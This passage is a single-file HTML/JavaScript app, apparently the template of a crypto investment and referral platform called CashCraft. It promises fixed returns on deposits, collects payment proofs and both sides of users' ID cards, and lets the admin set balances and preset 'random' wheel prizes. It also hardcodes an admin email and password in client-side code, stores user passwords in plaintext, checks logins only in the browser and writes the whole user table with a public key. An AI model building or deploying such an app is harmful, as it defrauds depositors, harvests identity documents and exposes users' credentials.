<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CashCraft</title>
<style>*{box-sizing:border-box;margin:0;padding:0;font-family:Segoe UI;}body{background:#0a0f1d;color:#fff;padding-bottom:70px}.app-container{max-width:600px;margin:auto;background:#0f1c3f;min-height:100vh;display:flex;flex-direction:column}.navbar{background:#172554;padding:12px;display:flex;justify-content:space-between;align-items:center}.logo{color:#60a5fa;font-weight:bold}.nav-avatar{width:36px;height:36px;border-radius:50%;border:2px solid #60a5fa}.profile-avatar-large{width:80px;height:80px;border-radius:50%;border:3px solid #3b82f6}.level-badge{background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;padding:2px 8px;border-radius:12px;font-size:10px}.bottom-nav{position:fixed;bottom:0;left:0;right:0;max-width:600px;margin:auto;background:#0b132b;display:flex;justify-content:space-around;padding:8px 0;border-top:1px solid #1d4ed8}.nav-item{background:transparent;border:none;color:#93c5fd;display:flex;flex-direction:column;align-items:center;font-size:9px;cursor:pointer;flex:1}.nav-item.active{color:#60a5fa;font-weight:bold}.content{flex:1;padding:20px}.card{background:#172554;padding:16px;border-radius:12px;margin-bottom:15px;border:1px solid #1e40af}.card h3{color:#f8fafc;font-size:16px;margin-bottom:10px;border-bottom:1px solid #1e40af;padding-bottom:6px}input,select{width:100%;padding:12px;margin:6px 0 12px;background:#0a0f1d;border:1px solid #3b82f6;border-radius:8px;color:#fff}.btn{background:#2563eb;color:#fff;border:none;padding:12px;border-radius:8px;width:100%;font-weight:bold;cursor:pointer}.btn-success{background:#059669}.btn-danger{background:#dc2626}.btn:disabled{background:#334155}.slider-container{position:relative;width:100%;height:320px;border-radius:12px;overflow:hidden;margin-bottom:15px;background:#0a0f1d}.slide{position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;transition:opacity 1s;display:flex;flex-direction:column;justify-content:flex-end;background-size:cover;background-position:center}.slide.active{opacity:1}.slide-caption{background:rgba(10,15,29,.85);padding:12px;text-align:center;font-size:12px}.wheel-box{text-align:center;background:radial-gradient(circle,#172554 0%,#0a0f1d 100%);padding:15px;border-radius:15px;border:3px solid #3b82f6;margin:auto}.wheel-title{background:linear-gradient(to bottom,#60a5fa,#2563eb);color:#fff;padding:4px 15px;border-radius:20px;display:inline-block;margin-bottom:8px;border:2px solid #93c5fd}.wheel-wrap{position:relative;display:inline-block}canvas{background:#0a0f1d;border-radius:50%;border:5px solid #1d4ed8}.pointer{position:absolute;top:-5px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:10px solid transparent;border-right:10px solid transparent;border-bottom:20px solid #60a5fa}.win-popup{position:fixed;top:20px;left:50%;transform:translateX(-50%) scale(.7);background:linear-gradient(135deg,#059669,#10b981);color:#fff;padding:15px 30px;border-radius:30px;font-weight:bold;z-index:9999;border:3px solid #6ee7b7;opacity:0;transition:all.3s}.win-popup.show{transform:translateX(-50%) scale(1);opacity:1}.chat-messages{flex:1;background:#0a0f1d;border:1px solid #1e40af;border-radius:8px;padding:8px;overflow-y:auto;margin-bottom:6px;height:200px}.msg{padding:6px 10px;margin:4px 0;border-radius:8px;max-width:85%;font-size:11px}.msg-user{background:#1e3a8a;margin-left:auto}.msg-admin{background:#1e293b;margin-right:auto}table{width:100%;border-collapse:collapse;margin-top:10px}th,td{border:1px solid #1e40af;padding:8px;text-align:center;font-size:11px}th{background:#172554;color:#93c5fd}.error-box{background:#7f1d1d;color:#fca5a5;padding:12px;border-radius:8px;text-align:center;margin-bottom:12px;font-size:13px}.link-text{color:#60a5fa;cursor:pointer;text-align:center;margin-top:12px;font-size:13px}
</style></head><body>
<div class="app-container" id="app"><div id="winPopup" class="win-popup">WON: $<span id="popup-amt">0</span>!</div></div>
<script>
const SUPABASE_URL = "https://qgmucqsefphoapgljjia.supabase.co";
const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_TykY2iZl-jZC89NeZ80Xkg_i4vRCx63";
const headers = {"apikey": SUPABASE_PUBLISHABLE_KEY, "Authorization": "Bearer " + SUPABASE_PUBLISHABLE_KEY, "Content-Type": "application/json"};
let defaultAdmin = { name: 'Admin Master', email: 'Natasha.lee@gmail.com', pass: 'NatashaAli12345', balance: 0, investment: 0, profit: 0, approved: 1, ref: 'ADMIN', referredBy: '', avatar: '', level: 1, lastTaskDate: '', taskReward: 0.35, wheelBalance: 0, wheelSequence: [], wheelLimit: 0, spinsUsed: 0, withdrawals: [], idFront: '', idBack: '' };
async function fetchUsersFromDB(){ try{ let res=await fetch(SUPABASE_URL + "/rest/v1/cashcraft_users?select=*", {headers}); if(res.ok){ let data=await res.json(); if(data && data.length>0){ let users=data.map(i=>i.data||i); if(!users.some(x=>x.email==='Natasha.lee@gmail.com')) users.unshift(defaultAdmin); localStorage.setItem('local_cashcraft_users', JSON.stringify(users)); return users; } } }catch(e){} let l=localStorage.getItem('local_cashcraft_users'); if(l){ try{return JSON.parse(l);}catch{} } return [defaultAdmin]; }
async function saveUsersToDB(list){ localStorage.setItem('local_cashcraft_users', JSON.stringify(list)); try{ for(let u of list){ await fetch(SUPABASE_URL+"/rest/v1/cashcraft_users", {method:'POST', headers:{...headers, Prefer:'resolution=merge-duplicates'}, body: JSON.stringify({email:u.email, data:u})}); } }catch{} }
async function fetchChatsFromDB(){ try{ let res=await fetch(SUPABASE_URL+"/rest/v1/cashcraft_chats?id=eq.1&select=*", {headers}); if(res.ok){ let d=await res.json(); if(d && d.length>0){ localStorage.setItem('local_cashcraft_chats', JSON.stringify(d[0].messages||[])); return d[0].messages||[]; } } }catch{} let l=localStorage.getItem('local_cashcraft_chats'); if(l){ try{return JSON.parse(l);}catch{} } return []; }
async function saveChatsToDB(list){ localStorage.setItem('local_cashcraft_chats', JSON.stringify(list)); try{ await fetch(SUPABASE_URL+"/rest/v1/cashcraft_chats", {method:'POST', headers:{...headers, Prefer:'resolution=merge-duplicates'}, body: JSON.stringify({id:1, messages:list})}); }catch{} }
let loggedUser=sessionStorage.getItem('logged_user'); let currentTab='dashboard'; let authMode='register'; let sliderInterval=null;
window.addEventListener('DOMContentLoaded', async()=>{ let p=new URLSearchParams(location.search); let r=p.get('ref'); if(r &&!loggedUser) sessionStorage.setItem('temp_ref', r); await initApp(); });
async function initApp(){ let users=await fetchUsersFromDB(); let idx=users.findIndex(x=>x.email==='Natasha.lee@gmail.com'); if(idx!==-1){ users[idx].email='Natasha.lee@gmail.com'; users[idx].pass='NatashaAli12345'; users[idx].approved=1; } else users.unshift(defaultAdmin); await saveUsersToDB(users); if(!localStorage.getItem('admin_wallet')) localStorage.setItem('admin_wallet','0xDefaultAdminBEP20WalletAddress'); render(); }
function calculateLevel(c){ if(c>=100)return 8; if(c>=70)return 7; if(c>=60)return 6; if(c>=50)return 5; if(c>=30)return 4; if(c>=10)return 3; if(c>=6)return 2; return 1; }
async function render(){ if(sliderInterval){clearInterval(sliderInterval); sliderInterval=null;} let app=document.getElementById('app'); let popup=`<div id="winPopup" class="win-popup">WON: $<span id="popup-amt">0</span>!</div>`; let users=await fetchUsersFromDB(); if(!loggedUser){ let ref=sessionStorage.getItem('temp_ref')||''; if(authMode==='register'){ app.innerHTML=popup+`<div style="padding:30px"><h2 style="color:#60a5fa;text-align:center">💎 CashCraft</h2><div class="card"><input type="text" id="reg_name" placeholder="Full Name"><input type="email" id="reg_email" placeholder="Gmail"><input type="password" id="reg_pass" placeholder="Password"><input type="text" id="reg_ref" value="${ref}" placeholder="Referral Code"><button class="btn btn-success" onclick="register()">Register Now</button></div><p class="link-text" onclick="setAuthMode('login')">Already have account? <b>Login</b></p></div>`; } else { app.innerHTML=popup+`<div style="padding:30px"><h2 style="color:#60a5fa;text-align:center">💎 CashCraft</h2><div class="card"><input type="email" id="log_email" placeholder="Gmail"><input type="password" id="log_pass" placeholder="Password"><button class="btn" onclick="login()">Login</button></div><p class="link-text" onclick="setAuthMode('register')">Don't have account? <b>Register</b></p></div>`; } } else if(loggedUser==='Natasha.lee@gmail.com'){ let wallet=localStorage.getItem('admin_wallet'); let rows=''; let tasks=''; let wdraw=''; let invest=''; let chats=''; users.forEach((u,i)=>{ if(u.email!=='Natasha.lee@gmail.com'){ let limit=u.wheelLimit||0; let used=u.spinsUsed||0; let team=users.filter(x=>x.referredBy===u.ref).length; let lvl=calculateLevel(team); let seq=u.wheelSequence||[]; let seqHtml=''; for(let s=0;s<Math.max(limit,1);s++){ let cur=seq[s]||''; seqHtml+=`<div><small>Spin ${s+1}:</small> <select id="seq_${i}_${s}" style="width:70px"><option value="" ${cur==''?'selected':''}>Random</option><option value="1" ${cur==1?'selected':''}>$1</option><option value="3" ${cur==3?'selected':''}>$3</option><option value="6" ${cur==6?'selected':''}>$6</option><option value="10" ${cur==10?'selected':''}>$10</option><option value="20" ${cur==20?'selected':''}>$20</option><option value="50" ${cur==50?'selected':''}>$50</option><option value="100" ${cur==100?'selected':''}>$100</option></select></div>`; } rows+=`<tr><td><b>${u.name}</b><br>${u.email}<br><small>${u.pass}</small></td><td><input id="bal_${i}" value="${u.balance.toFixed(2)}" style="width:60px"><button onclick="updateUserBal(${i})" class="btn" style="padding:2px">Set</button></td><td>${team}</td><td>${seqHtml}<button onclick="updateUserWheelSeq(${i},${Math.max(limit,1)})" class="btn" style="padding:2px">Save</button></td><td><input id="limit_${i}" value="${limit}" style="width:40px"><button onclick="updateUserWheelLimit(${i})" class="btn" style="padding:2px">Set</button><br>Used:${used} <button onclick="resetSpins(${i})" class="btn btn-danger" style="padding:2px">Reset</button></td><td><input id="level_${i}" value="${lvl}" style="width:40px"><button onclick="updateUserLevel(${i})" class="btn" style="padding:2px">Set</button></td><td>${u.approved==0?`<button onclick="approveUser(${i})" class="btn btn-success" style="padding:4px">Approve</button>`:'Active'}</td></tr>`; tasks+=`<tr><td>${u.name}</td><td><input id="task_rew_${i}" value="${u.taskReward||0.35}" style="width:60px"><button onclick="updateTaskReward(${i})" class="btn" style="padding:2px">Update</button></td><td>${u.lastTaskDate===new Date().toDateString()?'Done':'Pending'}</td></tr>`; invest+=`<div class="card" style="border:2px solid ${u.approved==0?'#f59e0b':'#34d399'}"><h3>${u.name} (${u.email}) - $${(u.investment||0)} | Tx:${u.investmentNote||'No'}</h3><p>Status:${u.approved==0?'Pending':'Approved'}</p><div style="display:flex;gap:8px"><div style="flex:1;background:#0a0f1d;padding:6px;text-align:center;border:1px solid #3b82f6">${u.investmentScreenshot?`<img src="${u.investmentScreenshot}" style="max-width:100%;max-height:120px">`:'No pay'}</div><div style="flex:1;background:#0a0f1d;padding:6px;text-align:center;border:1px solid #3b82f6">${u.idFront?`<img src="${u.idFront}" style="max-width:100%;max-height:120px">`:'No front'}</div><div style="flex:1;background:#0a0f1d;padding:6px;text-align:center;border:1px solid #3b82f6">${u.idBack?`<img src="${u.idBack}" style="max-width:100%;max-height:120px">`:'No back'}</div></div><div style="display:flex;gap:8px;margin-top:8px"><button class="btn btn-success" onclick="adminApproveInvestment(${i})">Approve</button><button class="btn btn-danger" onclick="adminRejectInvestment(${i})">Reject</button></div></div>`; chats+=`<div class="card"><h3>${u.name}</h3><div class="chat-messages" id="specific-chat-${i}"></div><input id="admin_msg_${i}" placeholder="Reply"><button class="btn" onclick="sendAdminSpecificChat('${u.email}',${i})">Send</button></div>`; if(u.withdrawals){ u.withdrawals.forEach((w,wi)=>{ let act=w.status==='Pending'?`<button onclick="approveWithdrawal(${i},${wi})" class="btn btn-success" style="padding:4px">Approve</button> <button onclick="rejectWithdrawal(${i},${wi})" class="btn btn-danger" style="padding:4px">Reject</button>`:w.status; wdraw+=`<tr><td>${u.name}<br>${u.email}</td><td>$${w.amount} Fee:$${w.fee} Net:$${w.netAmount}</td><td>${w.address}<br>${w.date}</td><td>${act}</td></tr>`; }); } } }); if(!wdraw) wdraw=`<tr><td colspan="4">No withdrawals</td></tr>`; app.innerHTML=popup+`<div class="navbar"><div class="logo">👑 Admin Panel</div><button onclick="logout()" class="btn btn-danger" style="width:auto;padding:6px">Logout</button></div><div class="content"><div class="card"><h3>Set BEP20 Wallet</h3><input id="admin_wallet_input" value="${wallet}"><button class="btn btn-success" onclick="saveAdminWallet()">Update</button></div><div class="card"><h3>Investment Proofs</h3>${invest||'No proofs'}</div><div class="card"><h3>Withdrawals</h3><table><tr><th>User</th><th>Amount</th><th>Wallet</th><th>Action</th></tr>${wdraw}</table></div><div class="card"><h3>Users</h3><div style="overflow-x:auto"><table><tr><th>User</th><th>Bal</th><th>Team</th><th>Seq</th><th>Limit</th><th>Lvl</th><th>Status</th></tr>${rows}</table></div></div><div class="card"><h3>Tasks</h3><table><tr><th>User</th><th>Reward</th><th>Status</th></tr>${tasks}</table></div>${chats}</div>`; setTimeout(loadAllAdminSpecificChats,100); } else { let u=users.find(x=>x.email===loggedUser); if(!u){logout(); return;} let team=users.filter(x=>x.referredBy===u.ref); let lvl=calculateLevel(team.length); if(u.level!==lvl){ u.level=lvl; await saveUsersToDB(users);} let avatar=u.avatar||'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=100&q=80'; app.innerHTML=popup+`<div class="navbar"><div class="logo">💎 CashCraft</div><div style="display:flex;align-items:center;gap:6px"><img src="${avatar}" class="nav-avatar"><b>${u.name}</b> <span class="level-badge">Lvl ${lvl}</span></div></div><div class="content" id="tab-content"></div><div class="bottom-nav"><button class="nav-item ${currentTab=='dashboard'?'active':''}" onclick="switchTab('dashboard')">🏠<br>Home</button><button class="nav-item ${currentTab=='investment'?'active':''}" onclick="switchTab('investment')">💳<br>Invest</button><button class="nav-item ${currentTab=='tasks'?'active':''}" onclick="switchTab('tasks')">📋<br>Tasks</button><button class="nav-item ${currentTab=='wheel'?'active':''}" onclick="switchTab('wheel')">🎡<br>Wheel</button><button class="nav-item ${currentTab=='withdraw'?'active':''}" onclick="switchTab('withdraw')">💵<br>Withdraw</button><button class="nav-item ${currentTab=='referral'?'active':''}" onclick="switchTab('referral')">👥<br>Team</button><button class="nav-item ${currentTab=='support'?'active':''}" onclick="switchTab('support')">💬<br>Support</button></div>`; renderTabContent(); } }
function setAuthMode(m){authMode=m; render();} function switchTab(t){currentTab=t; render();}
async function renderTabContent(){ let users=await fetchUsersFromDB(); let u=users.find(x=>x.email===loggedUser); if(!u) return; let wallet=localStorage.getItem('admin_wallet'); let c=document.getElementById('tab-content'); let today=new Date().toDateString(); let done=u.lastTaskDate===today; let rew=u.taskReward||0.35; let limit=u.wheelLimit||0; let used=u.spinsUsed||0; let rem=Math.max(0,limit-used); let wbal=u.wheelBalance||0; let team=users.filter(x=>x.referredBy===u.ref); let lvl=calculateLevel(team.length); let link=location.origin+location.pathname+'?ref='+u.ref; let avatar=u.avatar||'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=100&q=80'; if(currentTab==='dashboard'){ c.innerHTML=`<div class="card" style="background:rgba(30,58,138,.5);border:1px solid #3b82f6;padding:12px;font-size:12px">📌 Investment $${(u.investment||0).toFixed(2)} locked<br>Min withdraw $25<br>Within 24h</div><div class="card" style="text-align:center;background:linear-gradient(135deg,#1e3a8a,#172554);border:2px solid #60a5fa"><p>Main Balance</p><div style="font-size:38px;color:#34d399;font-weight:800">$${u.balance.toFixed(2)}</div></div><div class="slider-container" id="homeSlider"><div class="slide active" style="background-image:linear-gradient(to top,rgba(10,15,29,.95) 10%,rgba(10,15,29,.1) 70%),url('https://images.unsplash.com/photo-1593113598332-cd288d649433?auto=format&fit=crop&w=800&q=80')"><div class="slide-caption"><b>Food Drive Scene 1</b></div></div><div class="slide" style="background-image:linear-gradient(to top,rgba(10,15,29,.95) 10%,rgba(10,15,29,.1) 70%),url('https://images.unsplash.com/photo-1532629345422-7515f3d16bb9?auto=format&fit=crop&w=800&q=80')"><div class="slide-caption"><b>Ration Scene 2</b></div></div></div><div class="card" style="text-align:center"><img src="${avatar}" class="profile-avatar-large"><h3>${u.name} <span class="level-badge">Lvl ${lvl}</span></h3><p>Email:${u.email}</p><p>Status:${u.approved==1?'<span style="color:#34d399">Active</span>':'<span style="color:#f59e0b">Pending</span>'}</p><p>Investment:$${(u.investment||0).toFixed(2)} (Locked)</p><p>Profit:$${(u.profit||0).toFixed(2)}</p><div style="text-align:left;border-top:1px solid #1e40af;padding-top:10px;margin-top:10px"><label>Update DP:</label><input type="file" id="new_avatar_file" accept="image/*"><button class="btn" onclick="updateProfilePic()">Save DP</button></div></div><div class="card"><h3>Referral Link</h3><div style="background:#0a0f1d;padding:8px;border:1px solid #3b82f6;word-break:break-all;font-size:11px;color:#60a5fa">${link}</div><button class="btn btn-success" onclick="navigator.clipboard.writeText('${link}');alert('Copied!')">Copy Link</button><button class="btn btn-danger" style="margin-top:8px" onclick="logout()">Logout</button></div>`; startSlider(); } else if(currentTab==='investment'){ c.innerHTML=`<div class="card"><h3>💳 BEP20 Deposit</h3><div style="background:${u.approved==0?'rgba(245,158,11,.2)':'rgba(5,150,105,.2)'};padding:10px;border-radius:6px;margin-bottom:12px;text-align:center">Status:${u.approved==0?'Pending':'Approved'}</div><p style="font-size:11px">Plans: $25→$35, $50→$70, $100→$130, $150→$170, $250→$280, $500→$540, $800→$850, $1200→$1290, $1500→$1550 (100 days)</p><div style="background:#0a0f1d;padding:10px;border-radius:6px;border:1px dashed #60a5fa;margin:12px 0;word-break:break-all;color:#60a5fa">${wallet}</div><select id="inv_amt"><option value="25">$25 Pay $26 → $35</option><option value="50" selected>$50 Pay $51 → $70</option><option value="100">$100 Pay $101 → $130</option><option value="150">$150 → $170</option><option value="250">$250 → $280</option><option value="500">$500 → $540</option><option value="800">$800 → $850</option><option value="1200">$1200 → $1290</option><option value="1500">$1500 → $1550</option></select><input type="text" id="inv_msg" placeholder="TxID" value="${u.investmentNote||''}"><label>Payment Screenshot:</label><input type="file" id="inv_file" accept="image/*"><label>ID Front:</label><input type="file" id="id_front_file" accept="image/*"><label>ID Back:</label><input type="file" id="id_back_file" accept="image/*"><button class="btn btn-success" onclick="submitInvestment()">Submit to Admin</button></div>`; } else if(currentTab==='tasks'){ c.innerHTML=`<div class="card"><h3>📋 Daily Tasks</h3><p>Claim $${rew.toFixed(2)} daily</p>${u.approved==0?'<div class="error-box">Locked until approved!</div>':''}<div class="task-item"><div><h4>Daily Reward</h4><p>$${rew.toFixed(2)}</p></div><button class="btn btn-success" style="width:auto;padding:8px" ${u.approved==0||done?'disabled':''} onclick="claimTask(${rew})">${done?'Completed':'Claim $'+rew.toFixed(2)}</button></div></div>`; } else if(currentTab==='wheel'){ let locked=limit<=0||rem<=0; c.innerHTML=`<div style="text-align:center">${u.approved==0?'<div class="error-box">Locked until approved!</div><div style="opacity:.3;pointer-events:none">':'<div>'}<div class="wheel-box"><div class="wheel-title">Golden Cash Wheel</div><br><div style="background:rgba(5,150,105,.2);border:1px solid #10b981;padding:10px;border-radius:8px;margin-bottom:12px"><p style="font-size:11px;color:#6ee7b7">Wheel Balance</p><div style="font-size:26px;color:#34d399" id="wheel-bal-display">$${wbal.toFixed(2)}</div></div><p>Remaining: <b id="rem-spins">${rem}</b> (Limit:${limit})</p><div class="wheel-wrap"><div class="pointer"></div><canvas id="wheel" width="230" height="230"></canvas></div><br><button class="btn btn-success" id="spinBtn" onclick="spinWheel()" ${locked?'disabled':''}>${locked?'LOCKED':'SPIN NOW'}</button><h4 id="spinResult" style="color:#60a5fa;margin-top:10px"></h4></div></div></div>`; setTimeout(initWheel,100); } else if(currentTab==='withdraw'){ let hist=''; if(u.withdrawals && u.withdrawals.length>0){ u.withdrawals.slice().reverse().forEach(w=>{ let s=w.status==='Approved'?'<span style="color:#34d399">Approved</span>':w.status==='Rejected'?'<span style="color:#f87171">Rejected (Refunded)</span>':'<span style="color:#f59e0b">Pending</span>'; hist+=`<tr><td>$${w.amount}<br>Fee:$${w.fee} Net:$${w.netAmount}</td><td>${w.address}<br>${w.date}</td><td>${s}</td></tr>`; }); } else hist=`<tr><td colspan="3">No history</td></tr>`; c.innerHTML=`<div class="card"><h3>💵 Withdraw Min $25</h3><div style="background:rgba(5,150,105,.2);padding:10px;text-align:center">Balance: $${u.balance.toFixed(2)}</div><select id="wd_amount"><option value="25" selected>$25 Fee $1 Net $24</option><option value="30">$30 Fee $2.35 Net $27.65</option><option value="40">$40 Fee $3 Net $37</option><option value="50">$50 Fee $4 Net $46</option><option value="100">$100 Fee $5 Net $95</option><option value="150">$150 Fee $6 Net $144</option><option value="500">$500 Fee $8 Net $492</option></select><input id="wd_address" placeholder="BEP20 Wallet"><button class="btn btn-success" onclick="requestWithdrawal()">Submit Withdrawal</button></div><div class="card"><h3>History</h3><table><tr><th>Amount</th><th>Wallet</th><th>Status</th></tr>${hist}</table></div>`; } else if(currentTab==='referral'){ let rows=''; if(team.length>0){ team.forEach((m,idx)=>{ let sub=users.filter(x=>x.referredBy===m.ref).length; rows+=`<tr><td>${idx+1}</td><td>${m.name}</td><td>${m.email}</td><td>Lvl ${calculateLevel(sub)}</td><td>${m.approved==1?'Active':'Pending'}</td></tr>`; }); } else rows=`<tr><td colspan="5">No team yet</td></tr>`; let levels=''; for(let lv=1;lv<=8;lv++){ let need=[0,0,6,10,30,50,60,70,100][lv]; let unl=lv<=calculateLevel(team.length); levels+=`<div style="padding:8px 0;border-bottom:1px solid #1e40af;font-size:12px"><b>Level ${lv}</b> Need ${need} members ${unl?'<span style="color:#34d399">Unlocked</span>':'Locked'}</div>`; } c.innerHTML=`<div class="card"><h3>Levels Board 8 Levels</h3>${levels}</div><div class="card"><h3>My Team (${team.length}) Lvl ${lvl}</h3><table><tr><th>#</th><th>Name</th><th>Email</th><th>Level</th><th>Status</th></tr>${rows}</table><div style="margin-top:12px"><div style="background:#0a0f1d;padding:8px;border:1px solid #3b82f6;word-break:break-all;font-size:11px;color:#60a5fa">${link}</div><button class="btn btn-success" onclick="navigator.clipboard.writeText('${link}');alert('Copied!')">Copy Link</button></div></div>`; } else if(currentTab==='support'){ c.innerHTML=`<div class="card"><h3>💬 Support</h3><div class="chat-messages" id="user-chat-box"></div><input id="user_msg" placeholder="Type message"><button class="btn" onclick="sendUserChat()">Send</button></div>`; setTimeout(loadUserChats,100); } }
function startSlider(){ let slides=document.querySelectorAll('.slide'); if(!slides.length) return; let cur=0; sliderInterval=setInterval(()=>{ slides[cur].classList.remove('active'); cur=(cur+1)%slides.length; slides[cur].classList.add('active'); },3000); }
async function register(){ let name=document.getElementById('reg_name').value.trim(); let email=document.getElementById('reg_email').value.trim().toLowerCase(); let pass=document.getElementById('reg_pass').value.trim(); let refIn=document.getElementById('reg_ref').value.trim(); if(!name||!email||!pass){alert('Fill all');return;} let users=await fetchUsersFromDB(); if(users.some(x=>x.email.toLowerCase()===email)){alert('Email exists');return;} let refCode='REF'+Math.floor(1000+Math.random()*9000); let referred=''; if(refIn){ let ru=users.find(x=>x.ref===refIn); if(ru) referred=ru.ref; } let nu={name,email,pass,balance:0,investment:0,investmentNote:'',investmentScreenshot:'',idFront:'',idBack:'',profit:0,approved:0,ref:refCode,referredBy:referred,avatar:'',level:1,lastTaskDate:'',taskReward:0.35,wheelBalance:0,wheelSequence:[],wheelLimit:0,spinsUsed:0,withdrawals:[]}; users.push(nu); await saveUsersToDB(users); sessionStorage.removeItem('temp_ref'); alert('Registered! Login now'); authMode='login'; render(); }
async function login(){ let email=document.getElementById('log_email').value.trim().toLowerCase(); let pass=document.getElementById('log_pass').value.trim(); let users=await fetchUsersFromDB(); let u=users.find(x=>x.email.toLowerCase()===email && x.pass===pass); if(u){ loggedUser=u.email; sessionStorage.setItem('logged_user',loggedUser); render(); } else alert('Invalid'); }
function logout(){ loggedUser=null; sessionStorage.removeItem('logged_user'); render(); }
function saveAdminWallet(){ let v=document.getElementById('admin_wallet_input').value; if(!v){alert('Enter wallet');return;} localStorage.setItem('admin_wallet',v); alert('Updated'); }
async function submitInvestment(){ let amt=parseFloat(document.getElementById('inv_amt').value); let msg=document.getElementById('inv_msg').value; let f1=document.getElementById('inv_file'); let f2=document.getElementById('id_front_file'); let f3=document.getElementById('id_back_file'); if(!msg){alert('Enter TxID');return;} if(!f1.files.length||!f2.files.length||!f3.files.length){alert('Upload all images');return;} let pay=URL.createObjectURL(f1.files[0]); let front=URL.createObjectURL(f2.files[0]); let back=URL.createObjectURL(f3.files[0]); let users=await fetchUsersFromDB(); let idx=users.findIndex(x=>x.email===loggedUser); if(idx!==-1){ users[idx].investment=amt; users[idx].investmentNote=msg; users[idx].investmentScreenshot=pay; users[idx].idFront=front; users[idx].idBack=back; users[idx].profit={25:0.25,50:0.5,100:1,150:1.5,250:2.5,500:5,800:8,1200:12,1500:15}[amt]||amt*0.01; users[idx].approved=0; await saveUsersToDB(users); alert('Submitted to Admin'); switchTab('dashboard'); } }
async function adminApproveInvestment(i){ let users=await fetchUsersFromDB(); if(users[i]){ users[i].approved=1; await saveUsersToDB(users); alert('Approved '+users[i].name); render(); } }
async function adminRejectInvestment(i){ let users=await fetchUsersFromDB(); if(users[i]){ users[i].approved=0; users[i].investment=0; users[i].investmentNote=''; users[i].investmentScreenshot=''; users[i].idFront=''; users[i].idBack=''; await saveUsersToDB(users); alert('Rejected '+users[i].name); render(); } }
async function updateUserBal(i){ let v=parseFloat(document.getElementById('bal_'+i).value); let users=await fetchUsersFromDB(); if(users[i] &&!isNaN(v)){ users[i].balance=v; await saveUsersToDB(users); alert('Balance updated'); } }
async function updateUserWheelLimit(i){ let v=parseInt(document.getElementById('limit_'+i).value); let users=await fetchUsersFromDB(); if(users[i] &&!isNaN(v)){ users[i].wheelLimit=v; await saveUsersToDB(users); alert('Limit updated'); render(); } }
async function updateUserWheelSeq(i,cnt){ let users=await fetchUsersFromDB(); if(!users[i]) return; let seq=[]; for(let s=0;s<cnt;s++){ let el=document.getElementById('seq_'+i+'_'+s); if(el){ let val=el.value; seq.push(val===''? null : parseFloat(val)); } } users[i].wheelSequence=seq; await saveUsersToDB(users); alert('Sequence saved'); }
async function resetSpins(i){ let users=await fetchUsersFromDB(); if(users[i]){ users[i].spinsUsed=0; await saveUsersToDB(users); alert('Reset'); render(); } }
async function updateUserLevel(i){ let v=parseInt(document.getElementById('level_'+i).value); let users=await fetchUsersFromDB(); if(users[i] &&!isNaN(v)){ users[i].level=v; await saveUsersToDB(users); alert('Level updated'); } }
async function approveUser(i){ let users=await fetchUsersFromDB(); if(users[i]){ users[i].approved=1; await saveUsersToDB(users); alert('Approved'); render(); } }
async function updateTaskReward(i){ let v=parseFloat(document.getElementById('task_rew_'+i).value); let users=await fetchUsersFromDB(); if(users[i] &&!isNaN(v)){ users[i].taskReward=v; await saveUsersToDB(users); alert('Reward updated'); } }
async function claimTask(r){ let users=await fetchUsersFromDB(); let idx=users.findIndex(x=>x.email===loggedUser); if(idx===-1) return; let today=new Date().toDateString(); if(users[idx].lastTaskDate===today){ alert('Already claimed'); return; } if(users[idx].approved==0){ alert('Not approved'); return; } users[idx].balance+=r; users[idx].lastTaskDate=today; await saveUsersToDB(users); alert('Claimed $'+r.toFixed(2)); render(); }
let wheelPrizes=[1,3,6,10,15,20,25,35,50,85,100,0]; let curAngle=0; let spinning=false;
function initWheel(){ let cv=document.getElementById('wheel'); if(!cv) return; let ctx=cv.getContext('2d'); let n=wheelPrizes.length; let arc=2*Math.PI/n; ctx.clearRect(0,0,230,230); for(let i=0;i<n;i++){ ctx.beginPath(); ctx.fillStyle=i%2==0?'#172554':'#1e3a8a'; ctx.moveTo(115,115); ctx.arc(115,115,110,i*arc,(i+1)*arc); ctx.lineTo(115,115); ctx.fill(); ctx.strokeStyle='#60a5fa'; ctx.stroke(); ctx.save(); ctx.translate(115,115); ctx.rotate(i*arc+arc/2); ctx.fillStyle='#93c5fd'; ctx.font='10px Arial'; ctx.fillText('$'+wheelPrizes[i],50,0); ctx.restore(); } }
async function spinWheel(){ if(spinning) return; let users=await fetchUsersFromDB(); let idx=users.findIndex(x=>x.email===loggedUser); if(idx===-1) return; let u=users[idx]; let lim=u.wheelLimit||0; let used=u.spinsUsed||0; if(lim<=0||used>=lim){ alert('No spins! Admin locked'); return; } if(u.approved==0){ alert('Not approved'); return; } spinning=true; document.getElementById('spinBtn').disabled=true; let seq=u.wheelSequence||[]; let forced=null; if(seq.length>used && seq[used]!==null && seq[used]!=='') forced=Number(seq[used]); let prize; if(forced!==null &&!isNaN(forced)) prize=forced; else prize=wheelPrizes[Math.floor(Math.random()*wheelPrizes.length)]; let pi=wheelPrizes.indexOf(prize); if(pi===-1) pi=0; let arc=2*Math.PI/wheelPrizes.length; let target=3*Math.PI/2-(pi*arc+arc/2); let spins=5; let finalAng=spins*2*Math.PI+target; let cv=document.getElementById('wheel'); let ctx=cv.getContext('2d'); let start=curAngle; let dur=3000; let st=null; function anim(t){ if(!st) st=t; let e=t-st; let p=Math.min(e/dur,1); let ease=1-Math.pow(1-p,3); curAngle=start+(finalAng-start)*ease; ctx.save(); ctx.clearRect(0,0,230,230); ctx.translate(115,115); ctx.rotate(curAngle); ctx.translate(-115,-115); let n=wheelPrizes.length; let a2=2*Math.PI/n; for(let i=0;i<n;i++){ ctx.beginPath(); ctx.fillStyle=i%2==0?'#172554':'#1e3a8a'; ctx.moveTo(115,115); ctx.arc(115,115,110,i*a2,(i+1)*a2); ctx.lineTo(115,115); ctx.fill(); ctx.strokeStyle='#60a5fa'; ctx.stroke(); ctx.save(); ctx.translate(115,115); ctx.rotate(i*a2+a2/2); ctx.fillStyle='#93c5fd'; ctx.font='10px Arial'; ctx.fillText('$'+wheelPrizes[i],50,0); ctx.restore(); } ctx.restore(); if(p<1){ requestAnimationFrame(anim); } else { spinning=false; document.getElementById('spinBtn').disabled=false; users[idx].wheelBalance=(users[idx].wheelBalance||0)+prize; users[idx].spinsUsed=used+1; 